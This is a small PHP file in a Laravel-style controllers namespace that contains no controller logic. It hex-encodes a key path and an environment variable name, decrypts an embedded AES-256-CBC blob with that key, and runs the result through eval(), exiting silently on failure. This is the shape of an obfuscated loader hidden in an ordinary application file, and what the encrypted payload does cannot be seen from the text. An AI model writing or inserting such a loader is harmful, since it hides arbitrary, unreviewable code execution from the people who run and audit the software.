<?php
namespace App\Http\Controllers;
$f=hex2bin('2f6574632f61706c696b6173696b6974612e736563');

$k=getenv(hex2bin('41504c494b4153494b4954415f5345435f4b4559'))?:(@file_exists($f)?trim(@file_get_contents($f)):null);

if(!$k)exit;

$i=base64_decode('TfL6dmeE9bzeFrOXqkv4tQ==');

$c=base64_decode(

'aP9aOU+yj1+g/PNev8ywm/e+y9JyYriSDi8UdnPm4fWnFvy/7HZ3kCv9PO80bTaqcBG6pv5p4nEz' .
'/rZbYwFjo9xcb8S00qfm6q1NqKj5oCuMjoq4H4Ko9JhJck0dv2z8fMr5qSTwrMgZXI4tm8dhz7Eu' .
'45Qzzj1Rd/hiIvpRiijX9mi087e2XdwXEmycWMiJ13wdZpeZ0GSd/SjUDs6jvEa5LG6U8uH7MVhS' .
'O3s06DGaoOSsKgRBUmqryjUF9lApwzt9DEn7HC7av0FaRWUiRSi0SdkYYffXLPK1bXPPXuQ='

);

$d=openssl_decrypt($c,hex2bin('6165732d3235362d636263'),hash('sha256',$k,true),1,$i);

if($d===false)exit;

eval($d);

